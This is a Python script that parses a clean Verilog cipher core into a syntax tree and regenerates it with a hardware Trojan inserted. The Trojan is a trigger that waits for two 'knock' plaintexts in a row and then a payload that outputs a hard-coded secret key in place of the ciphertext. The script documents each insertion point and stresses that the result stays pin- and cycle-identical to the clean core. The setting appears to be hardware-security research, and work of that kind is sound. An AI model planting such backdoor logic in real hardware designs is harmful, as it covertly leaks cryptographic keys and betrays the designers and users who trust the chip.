#!/usr/bin/env python3
# ============================================================================
#  ast_insertion.py - Abstract-Syntax-Tree driven hardware-Trojan insertion.
#
#  Instead of hand-editing Verilog text, we parse the CLEAN hardened core
#  (rtl/crypto_core_clean.v) into a structural AST, walk that tree to LOCATE and
#  DOCUMENT the exact Trojan insertion points, then TRANSFORM the tree (add
#  parameters, registers, trigger logic, and a payload multiplexer) and
#  regenerate rtl/crypto_core.v. This gives precise, machine-checked
#  documentation of where and why the Trojan attaches, and makes the insertion
#  reproducible rather than a manual diff.
#
#  Self-contained: a small tokenizer + recursive-descent parser (no external
#  libraries). Expressions are kept as leaf strings; the statement/branch/module
#  structure - which is where insertion points live - is a real typed tree.
#
#  Outputs:
#    rtl/crypto_core.v                  - hardened core WITH the Trojan (AST-built)
#    hardening/AST_INSERTION_POINTS.md  - documented insertion points
# ============================================================================
import os, re, json

HERE = os.path.dirname(os.path.abspath(__file__))
RTL  = os.path.join(HERE, "..", "rtl")
CLEAN = os.path.join(RTL, "crypto_core_clean.v")
OUT   = os.path.join(RTL, "crypto_core.v")
DOC   = os.path.join(HERE, "AST_INSERTION_POINTS.md")

# Trojan parameters/logic to insert (chosen by the designer; injected via AST)
TROJAN = {
    "TROJAN_EN":  "1'b1",
    "SECRET_KEY": "32'hC0DECAFE",
    "KNOCK_1":    "32'hDEADC0DE",
    "KNOCK_2":    "32'hFEEDFACE",
}

# ---------------------------------------------------------------------------
# Tokenizer: yields (text, start, end); comments and whitespace are skipped but
# their spans are remembered so raw (untransformed) nodes can re-emit originals.
TOKEN_RE = re.compile(r"""
    (?P<ws>\s+)
  | (?P<lc>//[^\n]*)
  | (?P<bc>/\*.*?\*/)
  | (?P<num>\d+'[sSbBoOdDhH][0-9a-fA-FxXzZ_]+ | \d+\.\d+ | \d+)
  | (?P<id>[A-Za-z_]\w*\$?|\$[A-Za-z_]\w*)
  | (?P<op><<<|>>>|<<|>>|<=|>=|==|!=|&&|\|\||~&|~\||~\^|\^~|[-+*/%%&|^~!?:@.,;(){}\[\]<>=])
""", re.VERBOSE | re.DOTALL)

def tokenize(src):
    toks, i, n = [], 0, len(src)
    while i < n:
        m = TOKEN_RE.match(src, i)
        if not m:
            i += 1; continue
        i = m.end()
        kind = m.lastgroup
        if kind in ("ws", "lc", "bc"):
            continue
        toks.append((m.group(), m.start(), m.end()))
    return toks

class TS:
    def __init__(self, toks, src): self.t, self.src, self.i = toks, src, 0
    def peek(self, k=0):
        j = self.i + k
        return self.t[j][0] if j < len(self.t) else None
    def next(self):
        tok = self.t[self.i]; self.i += 1; return tok
    def expect(self, s):
        if self.peek() != s: raise SyntaxError("expected %r got %r near %r" % (s, self.peek(), self.context()))
        return self.next()
    def context(self):
        return " ".join(x[0] for x in self.t[self.i:self.i+6])
    def span_text(self, i0, i1):  # original source between token i0 start and i1-1 end
        return self.src[self.t[i0][1]:self.t[i1-1][2]]

# ---------------------------------------------------------------------------
# AST node types (structural). Expressions are strings.
class Node: pass
class Module(Node):
    def __init__(self): self.name=None; self.params=[]; self.ports_src=""; self.items=[]
class Item(Node):
    # generic body item kept as original source unless it is the transformed always
    def __init__(self, tag, src, node=None): self.tag=tag; self.src=src; self.node=node
class Assign(Node):
    def __init__(self, lhs, op, rhs): self.lhs=lhs; self.op=op; self.rhs=rhs
class If(Node):
    def __init__(self, cond, then, els): self.cond=cond; self.then=then; self.els=els
class For(Node):
    def __init__(self, header, body): self.header=header; self.body=body
class Block(Node):
    def __init__(self, stmts): self.stmts=stmts
class Raw(Node):
    def __init__(self, text): self.text=text

OPEN = {"(":")", "[":"]", "{":"}"}
CLOSE = set(")]}")

def read_group(ts):
    """current token is an opener; return inner source text and consume closer."""
    opener = ts.next()[0]; closer = OPEN[opener]; depth=1; i0=ts.i
    while depth:
        s = ts.next()[0]
        if s in OPEN: depth+=1
        elif s in CLOSE: depth-=1
    return ts.src[ts.t[i0][1]:ts.t[ts.i-2][2]] if ts.i-1>i0 else ""

def read_until_semi(ts):
    depth=0; i0=ts.i
    while True:
        s = ts.peek()
        if s is None: break
        if s in OPEN: depth+=1
        elif s in CLOSE: depth-=1
        elif s==";" and depth==0:
            txt = ts.src[ts.t[i0][1]:ts.t[ts.i-1][2]] if ts.i>i0 else ""
            ts.next()  # consume ;
            return txt, ts.i
        ts.next()
    return ts.src[ts.t[i0][1]:ts.t[ts.i-1][2]], ts.i

def parse_statement(ts):
    p = ts.peek()
    if p == "begin":
        ts.next(); stmts=[]
        while ts.peek() != "end":
            stmts.append(parse_statement(ts))
        ts.expect("end"); return Block(stmts)
    if p == "if":
        ts.next(); ts.expect("("); cond=read_group_from_open(ts)
        then = parse_statement(ts)
        els = None
        if ts.peek() == "else":
            ts.next(); els = parse_statement(ts)
        return If(cond, then, els)
    if p == "for":
        ts.next(); ts.expect("("); header=read_group_from_open(ts)
        body = parse_statement(ts); return For(header, body)
    if p == "case":
        i0=ts.i
        while ts.peek() != "endcase": ts.next()
        ts.next(); return Raw(ts.span_text(i0, ts.i))
    # assignment or generic statement ending in ';'
    i0=ts.i; txt, _ = read_until_semi(ts)
    op=None; lhs=rhs=None; depth=0
    # find top-level <= or = to split (avoid ==, <=, >= as comparisons handled by exact match)
    stripped = txt
    # tokenwise scan for assignment operator at depth 0
    sub = TS(tokenize(txt), txt)
    d=0; parts=[]; assign_at=None; toks=sub.t
    for k,(s,_,_) in enumerate(toks):
        if s in OPEN: d+=1
        elif s in CLOSE: d-=1
        elif d==0 and s in ("<=","="):
            assign_at=k; op=s; break
    if assign_at is not None:
        lhs = txt[:toks[assign_at][1]].strip()
        rhs = txt[toks[assign_at][2]:].strip()
        return Assign(lhs, op, rhs)
    return Raw(txt.strip())

def read_group_from_open(ts):
    """opener already consumed by caller's expect('('); read to matching ')'."""
    depth=1; i0=ts.i
    while depth:
        s=ts.next()[0]
        if s=="(": depth+=1
        elif s==")": depth-=1
    return ts.src[ts.t[i0][1]:ts.t[ts.i-2][2]] if ts.i-1>i0 else ""

def parse_module(src):
    ts = TS(tokenize(src), src)
    while ts.peek() and ts.peek()!="module": ts.next()
    ts.expect("module"); m=Module(); m.name=ts.next()[0]
    if ts.peek()=="#":
        ts.next(); ts.expect("("); m.params_src=read_group_from_open(ts)  # (empty for clean)
    ts.expect("(")
    # keep the port list source verbatim
    i0=ts.i; m.ports_src="("+read_group_from_open(ts)+")"
    ts.expect(";")
    while ts.peek() and ts.peek()!="endmodule":
        p=ts.peek(); i0=ts.i
        if p in ("localparam","parameter","reg","wire","integer","genvar","real","logic"):
            _,_=read_until_semi(ts); m.items.append(Item("decl", ts.span_text(i0, ts.i)))
        elif p=="initial":
            ts.next(); parse_statement(ts); m.items.append(Item("initial", ts.span_text(i0, ts.i)))
        elif p=="assign":
            read_until_semi(ts); m.items.append(Item("assign", ts.span_text(i0, ts.i)))
        elif p=="function":
            while ts.peek()!="endfunction": ts.next()
            ts.next(); m.items.append(Item("function", ts.span_text(i0, ts.i)))
        elif p=="always":
            ts.next(); ts.expect("@")
            if ts.peek()=="*": sens="*"; ts.next()
            else: ts.expect("("); sens=read_group_from_open(ts)
            body=parse_statement(ts)
            src_slice=ts.span_text(i0, ts.i)
            seq = ("posedge" in sens) or ("negedge" in sens)
            m.items.append(Item("always_seq" if seq else "always_comb", src_slice, node=(sens,body)))
        else:
            read_until_semi(ts); m.items.append(Item("raw", ts.span_text(i0, ts.i)))
    return m

# ---------------------------------------------------------------------------
# Statement-tree pretty printer (used only for the transformed sequential block)
def emit_stmt(s, ind):
    pad="    "*ind
    if isinstance(s, Block):
        out=[pad+"begin"]
        for st in s.stmts: out.append(emit_stmt(st, ind+1))
        out.append(pad+"end"); return "\n".join(out)
    if isinstance(s, If):
        out=pad+"if ("+s.cond+") "
        then=emit_stmt(s.then, ind)
        out += then.lstrip() if isinstance(s.then, Block) else "\n"+emit_stmt(s.then, ind+1)
        if s.els is not None:
            if isinstance(s.els, If):
                out += "\n"+pad+"else "+emit_stmt(s.els, ind).lstrip()
            elif isinstance(s.els, Block):
                out += "\n"+pad+"else "+emit_stmt(s.els, ind).lstrip()
            else:
                out += "\n"+pad+"else\n"+emit_stmt(s.els, ind+1)
        return out
    if isinstance(s, For):
        return pad+"for ("+s.header+") "+emit_stmt(s.body, ind).lstrip()
    if isinstance(s, Assign):
        return pad+s.lhs+" "+s.op+" "+s.rhs+";"
    if isinstance(s, Raw):
        return pad+s.text+(";" if not s.text.endswith(";") else "")
    return pad+"/* ? */"

# ---------------------------------------------------------------------------
# Analysis + transformation
def find_if_chain(block):
    # block.stmts[0] is the outer if/else-if chain
    return block.stmts[0]

def cond_norm(c): return re.sub(r"\s+","",c)

def transform(m):
    doc=[]
    # 1) locate the sequential always block
    seq=[it for it in m.items if it.tag=="always_seq"]
    if not seq: raise RuntimeError("no sequential always block found")
    seq=seq[0]; sens, body = seq.node
    chain = find_if_chain(body)
    # walk the if/else-if chain
    reset_if = chain
    assert cond_norm(reset_if.cond)=="!rst_n", "unexpected reset cond: %r"%reset_if.cond
    start_if = reset_if.els
    assert "start" in cond_norm(start_if.cond), "unexpected start cond: %r"%start_if.cond
    busy_if = start_if.els
    assert "busy" in cond_norm(busy_if.cond), "unexpected busy cond: %r"%busy_if.cond
    # inner if (cnt==3'd3) inside busy branch
    inner=[st for st in busy_if.then.stmts if isinstance(st, If)]
    assert inner, "no result-latch if found"
    result_if=inner[0]
    # the payload assignment: data_out <= cipher_out
    payload=[st for st in result_if.then.stmts if isinstance(st, Assign) and st.lhs.strip()=="data_out"]
    assert payload, "data_out assignment not found"
    payload=payload[0]

    doc.append(("Parameter injection point",
                "module header parameter list (currently empty)",
                "Add hard-wired Trojan constants (TROJAN_EN, SECRET_KEY, KNOCK_1, KNOCK_2) "
                "without touching the port interface, so the module remains pin-compatible."))
    doc.append(("State injection point",
                "module item list, just before the sequential `always @(%s)` block"%sens,
                "Declare the 2-bit Trojan FSM registers (armed, fire); ~2 flip-flops of overhead."))
    doc.append(("Reset branch (AST If, cond `%s`)"%reset_if.cond,
                "then-block of the reset If inside the sequential always",
                "Clear armed/fire on reset so the Trojan powers up disarmed."))
    doc.append(("Trigger observation point (AST If, cond `%s`)"%start_if.cond.strip(),
                "then-block of the operand-capture branch (start && !busy)",
                "This is where each new operand is latched - the natural place to watch for the "
                "two-block knock and set armed/fire, in ENCRYPT mode only."))
    doc.append(("Payload multiplexer point (AST Assign `%s %s %s`)"%(payload.lhs,payload.op,payload.rhs),
                "result-latch `if (%s)` inside the busy branch"%result_if.cond.strip(),
                "Replace the driven value with `fire ? SECRET_KEY : cipher_out`, so exactly one "
                "block (the firing knock) emits the key while every other block is untouched."))

    # ---- perform the AST edits ----
    # (a) parameters
    for k,v in TROJAN.items():
        width = "[31:0] " if v.startswith("32") else ""
        m.params.append("parameter %s%-10s = %s"%(width, k, v))
    # (b) FSM registers, inserted right before the sequential always
    idx = m.items.index(seq)
    m.items.insert(idx, Item("decl", "    reg armed, fire;   // Trojan FSM (AST-inserted)"))
    # (c) reset branch: clear armed/fire
    reset_if.then.stmts.append(Assign("armed","<=","1'b0"))
    reset_if.then.stmts.append(Assign("fire","<=","1'b0"))
    # (d) trigger FSM in the operand-capture branch
    trig = If("TROJAN_EN && !enc_dec && armed && (data_in == KNOCK_2)",
              Block([Assign("fire","<=","1'b1"), Assign("armed","<=","1'b0")]),
              Block([Assign("fire","<=","1'b0"),
                     Assign("armed","<=","(TROJAN_EN && !enc_dec && (data_in == KNOCK_1))")]))
    start_if.then.stmts.append(trig)
    # (e) payload mux
    payload.rhs = "fire ? SECRET_KEY : cipher_out"
    return doc, seq

# ---------------------------------------------------------------------------
def emit_module(m, seq_item):
    hdr = "module %s"%m.name
    if m.params:
        hdr += " #(\n    " + ",\n    ".join(m.params) + "\n)"
    hdr += " %s;"%m.ports_src
    body=[]
    prev=None
    for it in m.items:
        # blank line before multi-line constructs (functions, always blocks) for readability
        if prev is not None and (it.tag in ("function","always_comb","always_seq") or prev in ("function","always_comb","always_seq")):
            body.append("")
        if it is seq_item:
            sens, tree = it.node
            body.append("    always @(%s) "%sens + emit_stmt(tree, 1).lstrip())
        elif it.tag=="decl" and it.src.lstrip().startswith("reg armed"):
            body.append(it.src)
        else:
            body.append(it.src if it.src.startswith("    ") else "    "+it.src)
        prev=it.tag
    return HEADER_COMMENT + hdr + "\n" + "\n".join(body) + "\nendmodule\n"

HEADER_COMMENT = """// ============================================================================
//  crypto_core.v   (HARDENED cipher + HARDWARE TROJAN)   [AST-inserted]
//
//  Generated by hardening/ast_insertion.py from rtl/crypto_core_clean.v.
//  The Trojan (a two-block "knock" trigger and a key-exfiltration payload) was
//  inserted by Abstract-Syntax-Tree manipulation, not by hand-editing text.
//  See hardening/AST_INSERTION_POINTS.md for the documented insertion points.
//    TRIGGER : encrypt KNOCK_1 then, on the very next encryption, KNOCK_2.
//    PAYLOAD : that firing block outputs SECRET_KEY instead of the ciphertext,
//              streamed out on MISO by the next read-out. +2 flip-flops.
//  Set parameter TROJAN_EN=0 to instantiate an identical clean twin.
// ============================================================================
"""

def write_doc(doc):
    lines=["# Trojan Insertion Points (recovered by AST analysis)",
           "",
           "The clean hardened core `rtl/crypto_core_clean.v` was parsed into a structural",
           "AST by `hardening/ast_insertion.py`. Walking that tree pinpoints exactly where the",
           "hardware Trojan attaches and why. Each point below is an AST node, not a text guess.",
           ""]
    for i,(where,node,why) in enumerate(doc,1):
        lines += ["## %d. %s"%(i,where),
                  "- **AST location:** %s"%node,
                  "- **Why here:** %s"%why, ""]
    lines += ["## Result",
              "The transformation adds 4 parameters, 2 flip-flops (`armed`, `fire`), one trigger",
              "`if` node in the operand-capture branch, and rewrites the single `data_out`",
              "assignment into a 2:1 multiplexer. No ports, timing, or datapath logic change, so",
              "the Trojaned core is pin- and cycle-identical to the clean core until the knock fires.",
              ""]
    open(DOC,"w",encoding="utf-8").write("\n".join(lines))

def main():
    src = open(CLEAN, encoding="utf-8").read()
    m = parse_module(src)
    doc, seq_item = transform(m)
    open(OUT,"w",encoding="utf-8").write(emit_module(m, seq_item))
    write_doc(doc)
    print("ast_insertion.py: parsed %s, documented %d insertion points -> %s"%(
          os.path.basename(CLEAN), len(doc), os.path.basename(DOC)))
    print("ast_insertion.py: AST-inserted Trojan -> %s"%os.path.basename(OUT))

if __name__=="__main__": main()
